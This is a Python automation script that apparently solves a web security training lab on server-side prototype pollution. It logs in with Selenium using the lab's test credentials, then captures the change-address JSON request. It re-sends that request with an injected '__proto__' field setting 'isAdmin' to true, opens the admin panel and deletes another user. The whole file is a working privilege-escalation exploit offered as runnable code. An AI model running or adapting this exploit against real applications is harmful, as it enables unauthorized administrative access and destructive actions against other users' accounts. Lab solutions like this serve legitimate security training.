
from seleniumwire import webdriver

import typer

import json

from time import sleep

import requests
from rich.console import Console
from rich.text import Text
from rich.table import Table

def pretty_print(t,color):
    text = Text()
    text.append(t,style=f"bold {color}")
    return text


def login(driver,LAB_URL):
    driver.get(f"{LAB_URL}/login")
    form_username = driver.find_element("name","username")
    form_password = driver.find_element("name", "password")
    login_button = driver.find_element("xpath", '//*[contains(text(), "Log in")]')
    form_username.send_keys("wiener")
    sleep(1)
    form_password.send_keys("peter")
    sleep(1)
    current_url = driver.current_url
    login_button.click()
    sleep(2)
    return current_url

def update_billing_address(tags,driver):

    for key in tags:
        el = driver.find_element("name",key)
        el.clear()
        el.send_keys(tags[key])
        sleep(1)
    sessionId = driver.find_element("name", "sessionId").get_attribute("value")
    submit_button = driver.find_element("xpath", '//*[contains(text(), "Submit")]')
    submit_button.click()
    sleep(1)
    return sessionId

def manipulate_json(json_response,session_id):
    json_response.pop("isAdmin")
    malicious_json = json_response
    malicious_json["sessionId"] = session_id
    malicious_json["__proto__"] = {"isAdmin": True}
    return malicious_json

def send_POST_to_change_address(malicious_json,cookie,LAB_URL,console):
    endpoint_POST = f"{LAB_URL}/my-account/change-address"
    headers = {"Cookie": f"session={cookie}"}
    response = requests.post(url=endpoint_POST, data=json.dumps(malicious_json), headers=headers)
    t3 = pretty_print(f"Injected Response: {str(response.json())}","yellow")
    return response,t3

def go_to_admin_panel(driver):
    admin_button = driver.find_element("xpath", '//*[contains(text(), "Admin panel")]')
    admin_button.click()

def delete_carlos(driver):
    delete_buttons = driver.find_elements("xpath", '//*[contains(text(), "Delete")]')
    delete_buttons[1].click()

def main(lab_url: str):
    c = Console()
    table = Table()
    table.add_column("History", style="cyan")
    driver = webdriver.Chrome()
    lab_url=lab_url.rstrip("/")
    current_url = login(driver, lab_url)
    sleep(2)
    if driver.current_url != current_url:
        tags = {
            "address_line_1": "1900 Long Prairie Rd",
            "address_line_2": "1901 Long Prairie Rd",
            "city": "Flower Mound",
            "postcode": "75022",
            "country": "United States"
        }
        sessionId = update_billing_address(tags, driver)
        sleep(1)
        URL_BACKEND = ""
        # driver.implicitly_wait(10)
        for request in driver.requests:
            if request.response and "change-address" in request.url:
                URL_BACKEND = request.url
        cookie = driver.get_cookie("session")["value"]
        headers = {"Cookie": f"session={cookie}"}
        
        tags['sessionId'] = sessionId
        request_to_back_end = requests.post(URL_BACKEND, data=json.dumps(tags), headers=headers)
        json_risposta = request_to_back_end.json()
        t1 = pretty_print(f"Back-end response: {str(json_risposta)}","green")
        #c.print(t1)
        sleep(3)
        json_malevolo = manipulate_json(json_risposta, sessionId)
        t2 = pretty_print(f"Malicious payload: {str(json_malevolo)}","red")
        #c.print(t2)
        sleep(2)
        response,t3=send_POST_to_change_address(json_malevolo, cookie, lab_url,c)
        #c.print(t3)
        sleep(1)
        driver.refresh()
        sleep(2)
        go_to_admin_panel(driver)
        sleep(2)
        table.add_row(t1)
        table.add_row(t2)
        table.add_row(t3)
        c.print(table)
        delete_carlos(driver)
        
        sleep(50)


if __name__ == "__main__":
    typer.run(main)